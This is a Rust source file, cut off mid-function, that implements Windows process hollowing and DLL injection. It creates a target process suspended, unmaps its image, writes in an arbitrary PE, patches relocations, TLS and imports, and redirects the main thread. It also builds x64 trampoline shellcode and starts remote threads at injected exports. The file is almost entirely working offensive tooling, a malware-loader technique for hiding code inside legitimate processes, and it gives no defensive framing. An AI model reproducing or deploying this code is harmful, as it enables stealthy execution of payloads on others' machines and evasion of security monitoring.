use windows::{Win32::{Foundation::*, System::{LibraryLoader::*, Threading::*, Memory::*, Diagnostics::Debug::*}}};
use windows::Wdk::System::{Memory::NtUnmapViewOfSection, Threading::NtQueryInformationProcess};
use windows::Win32::System::SystemServices::IMAGE_DOS_HEADER;
use windows_strings::{PSTR, PCSTR};
use std::ffi::c_void;
use crate::PluginApp;


impl PluginApp {
    /// A corrected and robust implementation of process hollowing for EXEs.
    pub unsafe fn hollow_process_with_exe2(pe_data: &[u8], target_exe: &str) -> anyhow::Result<u32, anyhow::Error> {
        log::info!("Starting process hollowing for target: {}", target_exe);

        // 1. Create the target process in a suspended state
        let startup_info = STARTUPINFOA::default();
        let mut process_info = PROCESS_INFORMATION::default();
        let mut command_line = format!("{}\0", target_exe);
        unsafe {
            CreateProcessA(
                None,
                Some(PSTR(command_line.as_mut_ptr())),
                None,
                None,
                false,
                CREATE_SUSPENDED,
                None,
                None,
                &startup_info,
                &mut process_info,
            )?
        };
        log::info!("Suspended process created. PID: {}", process_info.dwProcessId);

        let h_process = process_info.hProcess;
        let h_thread = process_info.hThread;

        // 2. Get the PEB address and image base address
        let mut pbi = PROCESS_BASIC_INFORMATION::default();
        let status = unsafe {
            NtQueryInformationProcess(
                h_process,
                windows::Wdk::System::Threading::PROCESSINFOCLASS(0),
                &mut pbi as *mut _ as *mut c_void,
                std::mem::size_of::<PROCESS_BASIC_INFORMATION>() as u32,
                std::ptr::null_mut(),
            )
        };
        
        if !status.is_ok() {
            return Err(anyhow::anyhow!("NtQueryInformationProcess failed with status: {:?}", status));
        }

        log::info!("Remote PEB at: {:?}", pbi.PebBaseAddress);

        let image_base_addr_ptr = (pbi.PebBaseAddress as usize + 0x10) as *mut c_void;
        let mut remote_image_base_buf = [0u8; std::mem::size_of::<usize>()];
        unsafe {
            ReadProcessMemory(
                h_process,
                image_base_addr_ptr,
                remote_image_base_buf.as_mut_ptr() as *mut c_void,
                remote_image_base_buf.len(),
                None,
            )?
        };
        let remote_image_base = usize::from_le_bytes(remote_image_base_buf);
        log::info!("Original image base: 0x{:X}", remote_image_base);

        // 3. Unmap the original executable
        let status = unsafe { NtUnmapViewOfSection(h_process, Some(remote_image_base as *mut c_void)) };
        if status.is_err() {
            log::warn!("NtUnmapViewOfSection returned non-success status: {:?}. This might be okay.", status);
        } else {
            log::info!("NtUnmapViewOfSection succeeded.");
        }

        // 4. Parse PE headers using goblin
        let pe = goblin::pe::PE::parse(pe_data)?;
        let opt = pe.header.optional_header.ok_or_else(|| anyhow::anyhow!("Missing optional header"))?;
        let image_base = opt.windows_fields.image_base as usize;
        let entry_rva = opt.standard_fields.address_of_entry_point;
        let size_of_image = opt.windows_fields.size_of_image as usize;
        let size_of_headers = opt.windows_fields.size_of_headers as usize;
        log::info!("Source PE parsed: Size=0x{:X}, EntryRVA=0x{:X}, PreferredBase=0x{:X}", size_of_image, entry_rva, image_base);

        // 5. Allocate memory for the new image with PAGE_EXECUTE_READWRITE
        let new_base = unsafe {
            VirtualAllocEx(
                h_process,
                None,
                size_of_image,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE,
            )
        } as usize;
        if new_base == 0 {
            return Err(anyhow::anyhow!("VirtualAllocEx failed: {}", std::io::Error::last_os_error()));
        }
        log::info!("New image allocated at: 0x{:X}", new_base);

        // 7. Write PE headers
        unsafe { WriteProcessMemory(
            h_process,
            new_base as *mut c_void,
            pe_data.as_ptr() as *const c_void,
            size_of_headers,
            None,
        )?};
        log::info!("Headers written at: 0x{:X}", new_base);

        // 8. Write sections
        use windows::Win32::System::Memory::{VirtualProtectEx, PAGE_PROTECTION_FLAGS, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, PAGE_READONLY, PAGE_READWRITE, PAGE_NOACCESS};
        for section in pe.sections.iter() {
            let dest = (new_base + section.virtual_address as usize) as *mut c_void;
            let src_offset = section.pointer_to_raw_data as usize;
            let raw_size = section.size_of_raw_data as usize;
            if raw_size == 0 {
                continue;
            }
            if src_offset + raw_size > pe_data.len() {
                log::warn!("Section {} out of bounds, skipping", String::from_utf8_lossy(section.name().unwrap_or_default().as_bytes()));
                continue;
            }
            let src = pe_data.as_ptr().wrapping_add(src_offset) as *const c_void;
            let write_section = unsafe {
                WriteProcessMemory(
                    h_process,
                    dest,
                    src,
                    raw_size,
                    None,
                )
            };
            if !write_section.is_ok() {
                log::warn!("WriteProcessMemory failed for section {}", String::from_utf8_lossy(section.name().unwrap_or_default().as_bytes()));
            } else {
                log::info!("Section {} written at: 0x{:X}", String::from_utf8_lossy(section.name().unwrap_or_default().as_bytes()), dest as usize);
            }
        }

        // 9. Update PEB image base
        let new_base_bytes = new_base.to_le_bytes();
        unsafe { WriteProcessMemory(
            h_process,
            image_base_addr_ptr,
            new_base_bytes.as_ptr() as *const c_void,
            new_base_bytes.len(),
            None,
        )?};
        log::info!("Remote PEB image base updated to 0x{:X}", new_base);
        
        // 10. Apply relocations if needed
        if new_base != image_base {
            log::info!("Applying relocations (delta: 0x{:X})...", new_base.wrapping_sub(image_base));
            if let Err(e) = Self::apply_relocations(pe_data, h_process, new_base, image_base) {
                log::error!("Relocations failed: {:?}", e);
                return Err(e);
            }

            // 10b. Patch TLS directory fields after relocation
            let tls_dir_opt = opt.data_directories.get_tls_table();
            if let Some(tls_dir) = tls_dir_opt {
                if tls_dir.virtual_address != 0 && tls_dir.size >= 24 { // Size for 64-bit TLS Directory
                    log::info!("Patching TLS directory after relocation");
                    let tls_va = tls_dir.virtual_address as usize;
                    let tls_rva_offset = crate::pe_helpers::rva_to_offset(pe_data, tls_va).unwrap_or(0);

                    if tls_rva_offset > 0 {
                        #[repr(C)]
                        #[derive(Copy, Clone, Debug)]
                        struct ImageTlsDirectory64 {
                            start_address_of_raw_data: u64,
                            end_address_of_raw_data: u64,
                            address_of_index: u64,
                            address_of_callbacks: u64,
                            size_of_zero_fill: u32,
                            characteristics: u32,
                        }
                        
                        if tls_rva_offset + std::mem::size_of::<ImageTlsDirectory64>() <= pe_data.len() {
                            let tls_dir_struct: &ImageTlsDirectory64 = unsafe { &*(pe_data.as_ptr().add(tls_rva_offset) as *const ImageTlsDirectory64) };
                            let mut patched_tls = *tls_dir_struct;
                            let delta = new_base.wrapping_sub(image_base);
                            
                            let patch_field = |field: u64| {
                                if field != 0 {
                                    field.wrapping_add(delta as u64)
                                } else {
                                    0
                                }
                            };

                            patched_tls.start_address_of_raw_data = patch_field(tls_dir_struct.start_address_of_raw_data);
                            patched_tls.end_address_of_raw_data = patch_field(tls_dir_struct.end_address_of_raw_data);
                            patched_tls.address_of_index = patch_field(tls_dir_struct.address_of_index);
                            patched_tls.address_of_callbacks = patch_field(tls_dir_struct.address_of_callbacks);

                            let remote_tls_addr = (new_base + tls_va) as *mut c_void;
                            if unsafe { WriteProcessMemory(h_process, remote_tls_addr, &patched_tls as *const _ as *const c_void, std::mem::size_of::<ImageTlsDirectory64>(), None) }.is_ok() {
                                log::info!("TLS directory patched successfully in remote process.");
                            } else {
                                log::warn!("Failed to write patched TLS directory to remote process.");
                            }
                        } else {
                            log::warn!("TLS directory offset out of bounds, skipping patch.");
                        }
                    }
                }
            }
        }
        
        // 11. Resolve imports
        log::info!("Resolving imports...");
        if let Err(e) = Self::resolve_imports(pe_data, h_process, new_base as *mut c_void) {
            log::error!("Import resolution failed: {:?}", e);
            return Err(e);
        }

        // 12. Set all sections and PE header to PAGE_EXECUTE_READWRITE before resuming the thread
        log::info!("Setting all sections and PE header to PAGE_EXECUTE_READWRITE before resume...");
        for section in pe.sections.iter() {
            let dest = (new_base + section.virtual_address as usize) as *mut c_void;
            let size = std::cmp::max(section.virtual_size, section.size_of_raw_data) as usize;
            if size > 0 {
                let mut old_protect = PAGE_PROTECTION_FLAGS(0);
                if let Err(e) = unsafe { VirtualProtectEx(h_process, dest, size, PAGE_EXECUTE_READWRITE, &mut old_protect) } {
                    log::warn!("Failed to set PAGE_EXECUTE_READWRITE for section {}: {:?}", String::from_utf8_lossy(section.name().unwrap_or_default().as_bytes()), e);
                }
            }
        }
        // Set PE header to PAGE_EXECUTE_READWRITE
        let mut old_protect_header = PAGE_PROTECTION_FLAGS(0);
        if let Err(e) = unsafe { VirtualProtectEx(h_process, new_base as *mut c_void, size_of_headers, PAGE_EXECUTE_READWRITE, &mut old_protect_header) } {
            log::warn!("Failed to set PAGE_EXECUTE_READWRITE for PE header: {:?}", e);
        }
        unsafe { FlushInstructionCache(h_process, None, 0)? };
        log::info!("Instruction cache flushed before resume.");

        // 13. Set thread context to new entry point
        let mut context = CONTEXT::default();
        context.ContextFlags = CONTEXT_ALL_AMD64;
        unsafe { GetThreadContext(h_thread, &mut context)? };
        #[cfg(target_arch = "x86_64")]
        {
            context.Rip = new_base as u64 + entry_rva as u64;
        }
        #[cfg(target_arch = "x86")]
        {
            context.Eip = (new_base as u32).wrapping_add(entry_rva);
        }
        log::info!("Setting thread entry point to 0x{:X}", new_base as u64 + entry_rva as u64);
        let set_ctx = unsafe { SetThreadContext(h_thread, &context) };
        if let Err(e) = set_ctx {
            let err = unsafe { windows::Win32::Foundation::GetLastError() };
            log::error!("Win32 Error: {}", err.to_hresult().message());
            return Err(anyhow::anyhow!("SetThreadContext failed: {e:?}"));
        }

        // 14. Resume thread
        log::info!("Resuming main thread...");
        let resume_count = unsafe { ResumeThread(h_thread) };
        if resume_count == u32::MAX {
            let err = unsafe { windows::Win32::Foundation::GetLastError() };
            log::error!("Win32 Error: {}", err.to_hresult().message());
            return Err(anyhow::anyhow!("ResumeThread failed"));
        }
        log::info!("ResumeThread returned: {}", resume_count);

        // 15. After a short delay, set final protections
        std::thread::sleep(std::time::Duration::from_millis(200));
        log::info!("Setting final section protections after delay...");
        for section in pe.sections.iter() {
            let dest = (new_base + section.virtual_address as usize) as *mut c_void;
            let size = std::cmp::max(section.virtual_size, section.size_of_raw_data) as usize;
            let characteristics = section.characteristics;
            if size > 0 {
                let protection = if characteristics & 0x20000000 != 0 { // EXECUTE
                    if characteristics & 0x40000000 != 0 { // READ
                        if characteristics & 0x80000000 != 0 { PAGE_EXECUTE_READWRITE } else { PAGE_EXECUTE_READ }
                    } else {
                        PAGE_EXECUTE_READ // Default to Execute+Read
                    }
                } else if characteristics & 0x80000000 != 0 { // WRITE
                    PAGE_READWRITE
                } else if characteristics & 0x40000000 != 0 { // READ
                    PAGE_READONLY
                } else {
                    PAGE_NOACCESS
                };
                let mut old_protect = PAGE_PROTECTION_FLAGS(0);
                if let Err(e) = unsafe { VirtualProtectEx(h_process, dest, size, protection, &mut old_protect) } {
                    log::warn!("Failed to set final protection for section {}: {:?}", String::from_utf8_lossy(section.name().unwrap_or_default().as_bytes()), e);
                }
            }
        }
        // Set PE header to READONLY
        let mut old_protect_header = PAGE_PROTECTION_FLAGS(0);
        if let Err(e) = unsafe { VirtualProtectEx(h_process, new_base as *mut c_void, size_of_headers, PAGE_READONLY, &mut old_protect_header) } {
            log::warn!("Failed to set final protection for PE header: {:?}", e);
        }
        unsafe { FlushInstructionCache(h_process, None, 0)? };
        log::info!("Instruction cache flushed after final protections.");

        log::info!("Hollowing complete. New process PID: {}", process_info.dwProcessId);

        // Clean up handles
        unsafe { CloseHandle(h_thread) }?;
        unsafe { CloseHandle(h_process) }?;

        Ok(process_info.dwProcessId)
    }

    pub unsafe fn hollow_process_with_exe(pe_data: &[u8], target_exe: &str) -> anyhow::Result<u32, anyhow::Error> {
        log::info!("Starting process hollowing for target: {}", target_exe);

        // 1. Create the target process in a suspended state
        let startup_info = STARTUPINFOA::default();
        let mut process_info = PROCESS_INFORMATION::default();
        let mut command_line = format!("{}\0", target_exe);
        let success = unsafe {
            CreateProcessA(
                None,
                Some(PSTR(command_line.as_mut_ptr())),
                None,
                None,
                false,
                CREATE_SUSPENDED,
                None,
                None,
                &startup_info,
                &mut process_info,
            )
        };
        if !success.is_ok() {
            return Err(anyhow::anyhow!("CreateProcessA failed"));
        }
        log::info!("Suspended process created. PID: {}", process_info.dwProcessId);

        let h_process = process_info.hProcess;
        let h_thread = process_info.hThread;

        // 2. Get the PEB address and image base address
        let mut pbi = PROCESS_BASIC_INFORMATION::default();
        let status = unsafe {
            NtQueryInformationProcess(
                h_process,
                windows::Wdk::System::Threading::PROCESSINFOCLASS(0),
                &mut pbi as *mut _ as *mut c_void,
                std::mem::size_of::<PROCESS_BASIC_INFORMATION>() as u32,
                std::ptr::null_mut(),
            )
        };
        if !status.is_ok() {
            return Err(anyhow::anyhow!("NtQueryInformationProcess failed with status: {:?}", status));
        }
        log::info!("Remote PEB at: {:?}", pbi.PebBaseAddress);

        let image_base_addr_ptr = (pbi.PebBaseAddress as usize + 0x10) as *mut c_void;
        let mut remote_image_base_buf = [0u8; std::mem::size_of::<usize>()];
        unsafe {
            ReadProcessMemory(
                h_process,
                image_base_addr_ptr,
                remote_image_base_buf.as_mut_ptr() as *mut c_void,
                remote_image_base_buf.len(),
                None,
            )?
        };
        let remote_image_base = usize::from_le_bytes(remote_image_base_buf);
        log::info!("Original image base: 0x{:X}", remote_image_base);

        // 3. Unmap the original executable
        let status = unsafe { NtUnmapViewOfSection(h_process, Some(remote_image_base as *mut c_void)) };
        if status.is_err() {
            log::warn!("NtUnmapViewOfSection returned non-success status: {:?}. This might be okay.", status);
        } else {
            log::info!("NtUnmapViewOfSection succeeded.");
        }

        // 4. Parse PE headers using goblin
        let pe = goblin::pe::PE::parse(pe_data)?;
        let opt = pe.header.optional_header.ok_or_else(|| anyhow::anyhow!("Missing optional header"))?;
        let dos_header = unsafe { &*(pe_data.as_ptr() as *const IMAGE_DOS_HEADER) };
        let nt_headers_ptr = (pe_data.as_ptr() as usize + dos_header.e_lfanew as usize) as *mut IMAGE_NT_HEADERS64;
        let optional_header = unsafe { &mut (*nt_headers_ptr).OptionalHeader };
        let file_header = unsafe { &(*nt_headers_ptr).FileHeader };
        let image_base = opt.windows_fields.image_base as usize;
        let entry_rva = opt.standard_fields.address_of_entry_point;
        let size_of_image = opt.windows_fields.size_of_image as usize;
        let size_of_headers = opt.windows_fields.size_of_headers as usize;
        log::info!("Source PE parsed: Size=0x{:X}, EntryRVA=0x{:X}, PreferredBase=0x{:X}", size_of_image, entry_rva, image_base);

        // 5. Allocate memory for the new image
        let new_base = unsafe {
            VirtualAllocEx(
                h_process,
                None,
                size_of_image,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE,
            )
        } as usize;
        if new_base == 0 {
            return Err(anyhow::anyhow!("VirtualAllocEx failed: {}", std::io::Error::last_os_error()));
        }
        log::info!("New image allocated at: 0x{:X}", new_base);

        // 6. Patch image base in local headers before writing
        optional_header.ImageBase = new_base as u64;

        // 7. Write PE headers
        let write_headers = unsafe {
            WriteProcessMemory(
                h_process,
                new_base as *mut c_void,
                pe_data.as_ptr() as *const c_void,
                size_of_headers,
                None,
            )
        };
        if !write_headers.is_ok() {
            return Err(anyhow::anyhow!("WriteProcessMemory (headers) failed"));
        }
        log::info!("Headers written at: 0x{:X}", new_base);

        // 8. Write sections
        let sections_ptr = (nt_headers_ptr as usize + std::mem::size_of::<IMAGE_NT_HEADERS64>()) as *const IMAGE_SECTION_HEADER;
        let sections = unsafe { std::slice::from_raw_parts(sections_ptr, file_header.NumberOfSections as usize) };
        for section in sections {
            let dest = (new_base + section.VirtualAddress as usize) as *mut c_void;
            let src_offset = section.PointerToRawData as usize;
            let raw_size = section.SizeOfRawData as usize;
            if raw_size == 0 {
                continue;
            }
            if src_offset + raw_size > pe_data.len() {
                log::warn!("Section {} out of bounds, skipping", String::from_utf8_lossy(&section.Name));
                continue;
            }
            let src = pe_data.as_ptr().wrapping_add(src_offset) as *const c_void;
            let write_section = unsafe {
                WriteProcessMemory(
                    h_process,
                    dest,
                    src,
                    raw_size,
                    None,
                )
            };
            if !write_section.is_ok() {
                log::warn!("WriteProcessMemory failed for section {}", String::from_utf8_lossy(&section.Name));
            } else {
                log::info!("Section {} written at: 0x{:X}", String::from_utf8_lossy(&section.Name), dest as usize);
            }
        }

        // 9. Update PEB image base
        let new_base_bytes = new_base.to_le_bytes();
        unsafe {
            WriteProcessMemory(
                h_process,
                image_base_addr_ptr,
                new_base_bytes.as_ptr() as *const c_void,
                new_base_bytes.len(),
                None,
            )?
        };
        log::info!("Remote PEB image base updated to 0x{:X}", new_base);

        // 10. Apply relocations if needed
        if new_base != image_base {
            let delta = new_base.wrapping_sub(image_base);
            log::info!("Applying relocations (delta: 0x{:X})...", delta);
            Self::apply_relocations(pe_data, h_process, new_base, image_base)?;
        } else {
            log::info!("No relocations needed.");
        }

        // 11. Resolve imports
        log::info!("Resolving imports...");
        Self::resolve_imports(pe_data, h_process, new_base as *mut c_void)?;


        // 12. Set memory protection for the whole image (for reliability)
        let mut old_protect  = PAGE_PROTECTION_FLAGS(0);
        let protect_res = unsafe {
            VirtualProtectEx(
                h_process,
                new_base as *mut c_void,
                size_of_image,
                PAGE_EXECUTE_READWRITE,
                &mut old_protect,
            )
        };

        if let Err(e) = protect_res {
            log::error!("VirtualProtectEx failed for image: {e:?}");
        } else {
            log::info!("VirtualProtectEx succeeded for image");
        }

        // // 12b. Patch NtManageHotPatch in remote process for Win11 24H2+ compatibility
        // if let Err(e) = Self::patch_nt_manage_hotpatch64(h_process) {
        //     log::error!("patch_nt_manage_hotpatch64 failed: {e}");
        //     let err = unsafe { windows::Win32::Foundation::GetLastError() };
        //     log::error!("Win32 Error: {}", err.to_hresult().message());
        // } else {
        //     log::info!("NtManageHotPatch64 patched successfully");
        // }

        // 13. Set thread context to new entry point
        let mut context = CONTEXT::default();
        context.ContextFlags = CONTEXT_ALL_AMD64;
        let get_ctx = unsafe { GetThreadContext(h_thread, &mut context) };
        if let Err(e) = get_ctx {
            return Err(anyhow::anyhow!("GetThreadContext failed: {e:?}"));
        }
        #[cfg(target_arch = "x86_64")]
        {
            context.Rip = new_base as u64 + entry_rva as u64;
        }
        #[cfg(target_arch = "x86")]
        {
            context.Eip = (new_base as u32).wrapping_add(entry_rva);
        }
        log::info!("Setting thread entry point to 0x{:X}", new_base as u64 + entry_rva as u64);
        let set_ctx = unsafe { SetThreadContext(h_thread, &context) };
        if let Err(e) = set_ctx {
            return Err(anyhow::anyhow!("SetThreadContext failed: {e:?}"));
        }

        // 14. Resume thread
        log::info!("Resuming main thread...");
        let resume_count = unsafe { ResumeThread(h_thread) };
        if resume_count == u32::MAX {
            return Err(anyhow::anyhow!("ResumeThread failed"));
        }
        log::info!("ResumeThread returned: {}", resume_count);

        log::info!("Hollowing complete. New process PID: {}", process_info.dwProcessId);

        // Clean up handles
        unsafe { CloseHandle(h_thread) }?;
        unsafe { CloseHandle(h_process) }?;

        Ok(process_info.dwProcessId)
    }

        // Improved process hollowing with proper relocations and IAT
    pub unsafe fn inject_hollowed_process_improved(
        dll_data: &[u8],
        process_handle: HANDLE,
        function_name: &str,
        main_thread_handle: HANDLE
    ) -> anyhow::Result<(), anyhow::Error> {
        unsafe {
        log::info!("Starting inject_hollowed_process_improved");
            // Get proper entry point and base address
            let (preferred_base, _entry_rva, size_of_image) = Self::parse_pe_headers(dll_data)?;

            // Try to allocate at preferred base first, fallback if needed
            let mut alloc = VirtualAllocEx(
                process_handle,
                Some(preferred_base as *mut _),
                size_of_image,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE,
            );

            if alloc.is_null() {
                log::info!("Alloc is NULL");
                // Fallback allocation
                alloc = VirtualAllocEx(
                    process_handle,
                    None,
                    size_of_image,
                    MEM_COMMIT | MEM_RESERVE,
                    PAGE_EXECUTE_READWRITE,
                );
                if alloc.is_null() {
                    log::info!("[hollow][error] VirtualAllocEx failed");
                    return Err(anyhow::anyhow!("VirtualAllocEx failed"));
                }
            }

            let actual_base = alloc as usize;
            log::info!("DLL allocated at 0x{:X} (size: 0x{:X})", actual_base, size_of_image);
            log::info!("[debug] DLL allocated at 0x{:X} (size: 0x{:X})", actual_base, size_of_image);

            // Debug: check memory protection of allocated region
            use windows::Win32::System::Memory::VirtualQueryEx;
            use windows::Win32::System::Memory::MEMORY_BASIC_INFORMATION;
            let mut mbi = std::mem::MaybeUninit::<MEMORY_BASIC_INFORMATION>::zeroed();
            let mbi_size = std::mem::size_of::<MEMORY_BASIC_INFORMATION>();
            let vq_res = VirtualQueryEx(
                process_handle,
                Some(actual_base as *const _),
                mbi.as_mut_ptr(),
                mbi_size,
            );
            if vq_res == 0 {
                log::info!("[debug] VirtualQueryEx failed for alloc: 0x{:X}", actual_base);
            } else {
                let mbi = mbi.assume_init();
                log::info!("[debug] VirtualQueryEx alloc: Base=0x{:X}, RegionSize=0x{:X}, State=0x{:X}, Protect=0x{:X}, Type=0x{:X}",
                    mbi.BaseAddress as usize, mbi.RegionSize, mbi.State.0, mbi.Protect.0, mbi.Type.0);
            }

            // Map PE sections
            log::info!("Mapping PE sections");
            Self::map_pe_sections(dll_data, process_handle, alloc)?;

            // Apply relocations if base changed
            if actual_base != preferred_base {
                log::info!("Applying relocations");
                Self::apply_relocations(dll_data, process_handle, actual_base, preferred_base)?;
            }

            // Resolve imports (IAT fixups)
            log::info!("Resolving imports");
            Self::resolve_imports(dll_data, process_handle, alloc)?;
            // // Get function RVA and calculate remote address
            // let function_rva = Self::get_export_rva(dll_data, function_name)?;
            // let remote_export = actual_base + function_rva as usize;

            // // --- Shellcode stub (x64) ---
            // // mov rcx, 0
            // // mov rax, <remote_export>
            // // call rax
            // // mov ecx, 0
            // // mov rax, <ExitProcess>
            // // call rax
            // // ret
            // let exit_process = GetProcAddress(
            //     GetModuleHandleA(PCSTR(b"kernel32.dll\0".as_ptr())).unwrap(),
            //     PCSTR(b"ExitProcess\0".as_ptr()),
            // ).unwrap() as usize;

            // let mut shellcode: Vec<u8> = vec![
            //     0x48, 0xC7, 0xC1, 0x00, 0x00, 0x00, 0x00, // mov rcx, 0
            //     0x48, 0xB8, // mov rax, <remote_export>
            // ];
            // shellcode.extend_from_slice(&(remote_export as u64).to_le_bytes());
            // shellcode.extend_from_slice(&[0xFF, 0xD0]); // call rax
            // shellcode.extend_from_slice(&[0xB9, 0x00, 0x00, 0x00, 0x00]); // mov ecx, 0
            // shellcode.extend_from_slice(&[0x48, 0xB8]); // mov rax, <ExitProcess>
            // shellcode.extend_from_slice(&(exit_process as u64).to_le_bytes());
            // shellcode.extend_from_slice(&[0xFF, 0xD0]); // call rax
            // shellcode.push(0xC3); // ret

            // // Allocate memory for shellcode
            // let shellcode_addr = VirtualAllocEx(
            //     process_handle,
            //     None,
            //     shellcode.len(),
            //     MEM_COMMIT | MEM_RESERVE,
            //     PAGE_EXECUTE_READWRITE,
            // );
            // if shellcode_addr.is_null() {
            //     return Err(anyhow::anyhow!("VirtualAllocEx for shellcode failed"));
            // }
            // WriteProcessMemory(
            //     process_handle,
            //     shellcode_addr,
            //     shellcode.as_ptr() as _,
            //     shellcode.len(),
            //     None,
            // ).map_err(|e| anyhow::anyhow!("WriteProcessMemory(shellcode) failed: {}", e))?;

            // // Patch the main thread context to start at the shellcode stub
            // log::info!("[info] Setting main thread context to shellcode stub (calls export, then ExitProcess)");

            // --- Trampoline shellcode approach ---
            // 1. Allocate memory for shellcode in remote process
            // 2. Write shellcode: call export, then call ExitProcess
            // 3. Patch main thread context to shellcode
            // 4. Resume main thread

            // Get export address
            let function_rva = Self::get_export_rva(dll_data, function_name)?;
            let remote_export = actual_base + function_rva as usize;
            log::info!("Trampoline: export '{}' at 0x{:X}", function_name, remote_export);

            // Get ExitProcess address
            let kernel32 = GetModuleHandleA(PCSTR(b"kernel32.dll\0".as_ptr())).unwrap();
            let exit_process = GetProcAddress(kernel32, PCSTR(b"ExitProcess\0".as_ptr())).unwrap() as usize;

            // x64 shellcode:
            // mov rcx, 0
            // mov rax, <remote_export>
            // call rax
            // mov ecx, 0
            // mov rax, <ExitProcess>
            // call rax
            // ret
            let mut shellcode: Vec<u8> = vec![
                0x48, 0xC7, 0xC1, 0x00, 0x00, 0x00, 0x00, // mov rcx, 0
                0x48, 0xB8, // mov rax, <remote_export>
            ];
            shellcode.extend_from_slice(&(remote_export as u64).to_le_bytes());
            shellcode.extend_from_slice(&[0xFF, 0xD0]); // call rax
            shellcode.extend_from_slice(&[0xB9, 0x00, 0x00, 0x00, 0x00]); // mov ecx, 0
            shellcode.extend_from_slice(&[0x48, 0xB8]); // mov rax, <ExitProcess>
            shellcode.extend_from_slice(&(exit_process as u64).to_le_bytes());
            shellcode.extend_from_slice(&[0xFF, 0xD0]); // call rax
            shellcode.push(0xC3); // ret

            // Allocate memory for shellcode
            let shellcode_addr = VirtualAllocEx(
                process_handle,
                None,
                shellcode.len(),
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE,
            );
            if shellcode_addr.is_null() {
                log::info!("[hollow][error] VirtualAllocEx for shellcode failed");
                return Err(anyhow::anyhow!("VirtualAllocEx for shellcode failed"));
            }
            // Write shellcode
            WriteProcessMemory(
                process_handle,
                shellcode_addr,
                shellcode.as_ptr() as _,
                shellcode.len(),
                None,
            ).map_err(|e| anyhow::anyhow!("WriteProcessMemory(shellcode) failed: {}", e))?;

            // Patch main thread context to shellcode
            log::info!("Patching main thread context to trampoline shellcode at 0x{:X}", shellcode_addr as usize);
            let mut context = CONTEXT::default();
            #[cfg(target_arch = "x86_64")]
            {
                context.ContextFlags = CONTEXT_ALL_AMD64;
            }
            #[cfg(target_arch = "x86")]
            {
                context.ContextFlags = CONTEXT_ALL_X86;
            }
            GetThreadContext(main_thread_handle, &mut context)?;
            #[cfg(target_arch = "x86_64")]
            {
                context.Rip = shellcode_addr as u64;
                log::info!("[info] Set CONTEXT.Rip = 0x{:X} (trampoline shellcode)", shellcode_addr as usize);
            }
            #[cfg(target_arch = "x86")]
            {
                context.Eip = shellcode_addr as u32;
                log::info!("[info] Set CONTEXT.Eip = 0x{:X} (trampoline shellcode)", shellcode_addr as usize);
            }
            SetThreadContext(main_thread_handle, &context)?;

            log::info!("[info] Main thread context patched. Resuming main thread...");
            // let resume_count = ResumeThread(main_thread_handle);
            // log::info!("[info] ResumeThread(main) returned: {}", resume_count);
            log::info!("Hollowing complete. Export will be called by trampoline shellcode.");
            Ok(())
        }
    }

    
    /// Call an exported DLL function in a hollowed process
    /// Arguments:
    /// - process_handle: HANDLE to the hollowed process
    /// - dll_data: &[u8] of the DLL image
    /// - dll_base: base address where DLL is mapped in remote process
    /// - export_name: name of the exported function to call
    pub unsafe fn call_export_in_hollowed_process(
        process_handle: HANDLE,
        dll_data: &[u8],
        dll_base: usize,
        export_name: &str,
    ) -> anyhow::Result<(), anyhow::Error> {
        // Get the RVA of the export
        let export_rva = Self::get_export_rva(dll_data, export_name)?;
        log::info!("export_rva: {export_rva}");
        let remote_addr = dll_base + export_rva as usize;
        log::info!("remote_addr: {remote_addr}");

        // Print process handle value for diagnostics
        log::info!("[diagnostic] process_handle: 0x{:X}", process_handle.0 as usize);

        // Print integrity level of the target process
        match Self::get_process_integrity_level(process_handle) {
            Ok(level) => log::info!("[diagnostic] target process integrity level: {level:?}"),
            Err(e) => log::info!("[diagnostic] failed to get integrity level: {e}"),
        }

        // Check memory protection at remote_addr in the remote process
        use windows::Win32::System::Memory::VirtualQueryEx;
        use windows::Win32::System::Memory::MEMORY_BASIC_INFORMATION;
        let mut mbi = std::mem::MaybeUninit::<MEMORY_BASIC_INFORMATION>::zeroed();
        let mbi_size = std::mem::size_of::<MEMORY_BASIC_INFORMATION>();
        let vq_res = unsafe {
            VirtualQueryEx(
                process_handle,
                Some(remote_addr as *const _),
                mbi.as_mut_ptr(),
                mbi_size,
            )
        };
        if vq_res == 0 {
            log::info!("VirtualQueryEx failed for remote_addr: 0x{:X}", remote_addr);
        } else {
            let mbi = unsafe { mbi.assume_init() };
            log::info!("VirtualQueryEx: BaseAddress=0x{:X}, RegionSize=0x{:X}, State=0x{:X}, Protect=0x{:X}, Type=0x{:X}",
                mbi.BaseAddress as usize, mbi.RegionSize, mbi.State.0, mbi.Protect.0, mbi.Type.0);
        }

        // Resume the main thread if you have it (required for hollowed process)
        // This function now expects the caller to resume the thread before calling this export
        // If you have the main thread handle, resume it here
        // (If not, document that the caller must resume the thread before calling this function)

        // Print a warning if the process might still be suspended
        // (You may want to pass/process_info.hThread here for full automation)

        // EXTREMELY VERBOSE LOGGING for CreateRemoteThread
        log::info!("[VERBOSE] About to call CreateRemoteThread:");
        log::info!("  process_handle: 0x{:X}", process_handle.0 as usize);
        log::info!("  remote_addr (export): 0x{:X}", remote_addr);
        log::info!("  remote_addr as fn ptr: {:?}", unsafe {std::mem::transmute::<usize, *const ()>(remote_addr)});
        log::info!("  Parameters: lpThreadAttributes=None, dwStackSize=0, lpParameter=None, dwCreationFlags=0, lpThreadId=None");
        // Check process handle rights
        use windows::Win32::System::Threading::GetProcessId;
        let pid = unsafe { GetProcessId(process_handle) };
        log::info!("  Target PID: {}", pid);
        // Try to create the remote thread
        let thread_handle = unsafe {
            CreateRemoteThread(
                process_handle,
                None,
                0,
                Some(std::mem::transmute(remote_addr)),
                None,
                0,
                None,
            )
        };

        match thread_handle {
            Ok(handle) => {
                log::info!("[VERBOSE] CreateRemoteThread returned handle: 0x{:X}", handle.0 as usize);
                if handle.is_invalid() {
                    log::info!("[ERROR] CreateRemoteThread returned invalid handle!");
                    return Err(anyhow::anyhow!("CreateRemoteThread failed (invalid handle)"));
                }
                let wait_res = unsafe { WaitForSingleObject(handle, INFINITE) };
                log::info!("[VERBOSE] WaitForSingleObject returned: 0x{:X}", wait_res.0);
                let close_res = unsafe { CloseHandle(handle) };
                log::info!("[VERBOSE] CloseHandle returned: {:?}", close_res);
                Ok(())
            },
